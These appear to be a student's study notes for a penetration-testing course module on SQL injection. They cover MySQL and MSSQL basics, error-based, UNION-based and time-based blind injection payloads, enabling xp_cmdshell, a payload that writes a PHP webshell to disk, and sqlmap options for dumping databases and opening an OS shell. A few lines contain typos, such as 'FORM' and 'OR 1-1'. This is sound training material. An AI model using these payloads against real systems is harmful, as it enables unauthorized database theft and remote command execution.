# Module 10: SQL Injection Attacks

## SQL Theory and Databases

### SQL Theory Refresher

Structured Query Language (SQL) was developed to manage and interact with data stored inside _relational databases_. It can query, insert, modify, delete data, and in some cases execute operating system commands.

SQL syntax, commands, and functions vary based on which relational database they're made for. _MySQL, Microsoft SQL Server_, and _Oracle_ are the most popular database implementations.

{% hint style="warning" %}
{% code overflow="wrap" %}
```
The "i" inside the _mysqli_query_ stands for improved and should and if I was really not confused with the "i" in the SQLi vulnerability which stands for injection.
```
{% endcode %}
{% endhint %}

### DB Types and Characteristics

> **MySQL**

Connecting to the remote SQL instance, specifying **root** as the username and password, along with the default MySQL server port **3306**.

Example: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`

Note: If you're running into issues with self-signed certs, add the `--ssl=0` option. The error I received when working through the material was `ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain`

While inside the MySQL console shell, we can run various functions to retrieve additional information.

* Retrieving the version of the SQL instance: `select version();` or `select @@version;`
* Verifying the current database user for the ongoing session: `select system_user();`
* List databases: `show databases;`
* List tables in the mysql database: `show tables from mysql;`
* Selecting everything from the _user_ table in the _mysql_ database: `SELECT * FORM mysql.user;`

To improve security, user passwords are stored in the _authentication\_string_ field as a _Caching-SHA-256 algorithm_.

> **MSSQL** MSSQL is a database managemetn system that natively integrates into the Windows ecosystem.

Windows has a build-in CLI tool named _SQLCMD_, which allows SQL queries to be run through the Windows command prompt or remotely from another machine. Kali includes _Impacket_, a Python framework which enables network protocol interactions. It supports _Tabular Data Stream (TDS)_, the protocol adopted by MSSQL that is implemented in the _impacket-mssqlclient_ tool.

We can run `impacket-mssqlclient` to connect to the remote Windows machine running MSSQL. Using `-windows-auth` forces NTLM authentication rather than Kerberos. Example: `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`

Once inside the MSSQL console shell, we can run various functions similar to the previously noted MySQL commands.

{% hint style="warning" %}
{% code overflow="wrap" fullWidth="false" %}
```
When using a SQL Server CLI tool like sqlcmd, we must submit the SQL statement with a semicolon followed by GO on a separate line. However, running remote commands allows us to omit the GO statement as it's not part of the MSSQL TDS protocol.
```
{% endcode %}
{% endhint %}

* Verifying the version: `SELECT @@version;`
* List databases: `SELECT name FROM sys.databases;`\
  _master, tempdb, model_, and _msdb_ are default databases.
* Querying tables in the _offsec_ database: `SELECT * FROM offsec.information_schema.tables;`
* Selecting all records from the _users_ table under the table\_schema _dbo_ in the _offsec_ database: `SELECT * FROM offsec.dbo.users;`

## Manual SQL Exploitation

### Identifying SQLi via Error-based Payloads

In manual testing, we can try closing a quote and adding an `OR 1-1` statement followed by a `--` comment separate and two forward slashes (`//`) to prematurely terminate teh SQL statement. This syntax requires two consecutive dashes followed by at least **one** whitespace character. The example utilizes two slashes to provide visibility on the payload and add some protection against any kind of whitespace truncation employed. Example: `offsec' OR 1=1 -- //` The SQL query in this example will then result in the following backend SQL statement: `SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --`

A quick and simple test for SQLi is to submit a single quote `'` to see how the web application behaves. Note: _Most_ production-level web applications won't show errors because revealing SQL debugging information is considered a security flaw.

If we know a SQLi is available, we can inject an arbitrary second statement as well. Example: `' or 1=1 in (select @@version) -- //'`

### UNION-based Payloads

Whenever dealing with in-band SQLi where the result of the query is displayed along with the applciation-returend value, we should also test for _UNION-based_ SQL injections.

The **UNION** statements assists exploitation because it enables the execution of another SELECT statement, providing the results in the same query.

For a **UNION** SQLi to work, it has two requirements:

1. The injection **UNION** query has to include the same number of columns as the original query.
2. The data types must be compatible between each column.

To determine how many columns, we can submit the command `' ORDER BY 1-- //'`, incrementing the order until we receive an error which lets us know that numbered column does not exist. As an example, if the table has 5 columns, we can execute: `%' UNION SELECT database(), user(), @@version, null, null -- //` This resulted, in the material with displaying the result of user and version, but not database. Likely because the first column is typically reserved for the ID field consisting of _integer_ data type values, meaning a string cannot be returned for database(). With this in mind, let's re-order the request, ensuring the queries we know will return string, are "lined up" with the original select statement's columns. Example: `'UNION SELECT null, null, database(), user(), @@version -- //`

To expand on this, let's grab the columns table from the _information\_schema_ database belonging to the current database, storing the output in the second, third, and fourth columns. Example: `' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`

### Blind SQL Injections

A _blind_ SQLi describes scenarios where database responses are never returned and behavior is inferred using boolean- or time-based logic. Example time-based SQLi: `http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- //` In the above case, if the user _offsec_ does exist then the browser will hang for about three seconds, if not then it will immediately return.

## Manual and Automated Code Execution

### Manual Code Execution

In Microsoft SQL Server, the _xp\_cmdshell_ function takes a string and passes it to a command shell for execution. This function is disabled by default, and once enabled, must be called with the **EXECUTE** keyword rather than SELECT. To enable it, execute the following commands in a MSSQL shell:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

It can now be used like so: `EXECUTE xp_cmdshell 'whoami';`

Using a UNION-based payload, we can write a webshell into a file on disk. Example: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //` Running into the error regarding the value type not matching (column 1 being an integer for example) isn't an issue that affect writing to disk. The above code _should_ still write the webshell to the location written.

### Automating the Attack

There are several tools to automate SQLi. One very popular tool is **sqlmap**. Example usage of sqlmap: `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`

| Switch     | Explanation                      |
| ---------- | -------------------------------- |
| -u         | specify the URL to scan          |
| -p         | specify the parameter to test    |
| --dump     | dump the entire database         |
| --os-shell | provide a full interactive shell |

Because Blind SQLi can take so long, it can be useful to download the post/get request from burpsuite then providing it to sqlmap to automate this rather then doing it yourself.
